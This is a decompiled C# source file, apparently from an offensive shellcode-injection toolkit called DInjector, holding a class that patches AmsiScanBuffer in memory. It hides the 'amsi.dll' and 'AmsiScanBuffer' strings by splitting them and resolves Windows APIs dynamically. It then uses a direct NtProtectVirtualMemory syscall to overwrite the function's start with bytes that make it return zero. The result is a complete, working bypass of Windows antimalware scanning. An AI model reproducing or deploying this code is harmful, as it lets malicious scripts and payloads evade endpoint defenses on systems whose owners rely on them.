using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DInvoke.Data;
using DInvoke.DynamicInvoke;

namespace DInjector
{
	// Token: 0x02000016 RID: 22
	internal class AM51
	{
		// Token: 0x0600003F RID: 63 RVA: 0x0000503B File Offset: 0x0000323B
		public static void Patch()
		{
			AM51.ChangeBytes(AM51.x64);
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00005048 File Offset: 0x00003248
		private static void ChangeBytes(byte[] patch)
		{
			try
			{
				IntPtr pebLdrModuleEntry = Generic.GetPebLdrModuleEntry("kernel32.dll");
				string str = "am";
				string str2 = "si";
				string str3 = ".dll";
				object[] array = new object[]
				{
					str + str2 + str3
				};
				IntPtr intPtr = (IntPtr)Generic.DynamicFunctionInvoke(Generic.GetExportAddress(pebLdrModuleEntry, "LoadLibraryA", true), typeof(AM51.LoadLibraryA), ref array);
				string str4 = "Am";
				string str5 = "siScan";
				string str6 = "Buffer";
				object[] array2 = new object[]
				{
					intPtr,
					str4 + str5 + str6
				};
				IntPtr intPtr2 = (IntPtr)Generic.DynamicFunctionInvoke(Generic.GetExportAddress(pebLdrModuleEntry, "GetProcAddress", true), typeof(AM51.GetProcAddress), ref array2);
				AM51.NtProtectVirtualMemory ntProtectVirtualMemory = (AM51.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtProtectVirtualMemory"), typeof(AM51.NtProtectVirtualMemory));
				IntPtr destination = intPtr2;
				IntPtr handle = Process.GetCurrentProcess().Handle;
				IntPtr intPtr3 = (IntPtr)patch.Length;
				uint newProtect = 0U;
				DInvoke.Data.Native.NTSTATUS ntstatus = ntProtectVirtualMemory(handle, ref intPtr2, ref intPtr3, 4U, out newProtect);
				if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
				{
					Console.WriteLine("(AM51) [+] NtProtectVirtualMemory");
				}
				else
				{
					Console.WriteLine(string.Format("(AM51) [-] NtProtectVirtualMemory: {0}", ntstatus));
				}
				Console.WriteLine("(AM51) [>] Patching at address: " + string.Format("{0:X}", destination.ToInt64()));
				Marshal.Copy(patch, 0, destination, patch.Length);
				intPtr3 = (IntPtr)patch.Length;
				uint num;
				ntstatus = ntProtectVirtualMemory(handle, ref destination, ref intPtr3, newProtect, out num);
				if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
				{
					Console.WriteLine("(AM51) [+] NtProtectVirtualMemory");
				}
				else
				{
					Console.WriteLine(string.Format("(AM51) [-] NtProtectVirtualMemory: {0}", ntstatus));
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("(AM51) [x] " + ex.Message);
				Console.WriteLine(string.Format("(AM51) [x] {0}", ex.InnerException));
			}
		}

		// Token: 0x04000001 RID: 1
		private static readonly byte[] x64 = new byte[]
		{
			72,
			49,
			192
		};

		// Token: 0x0200007C RID: 124
		// (Invoke) Token: 0x06000143 RID: 323
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate IntPtr LoadLibraryA(string name);

		// Token: 0x0200007D RID: 125
		// (Invoke) Token: 0x06000147 RID: 327
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate IntPtr GetProcAddress(IntPtr hModule, string procName);

		// Token: 0x0200007E RID: 126
		// (Invoke) Token: 0x0600014B RID: 331
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);
	}
}
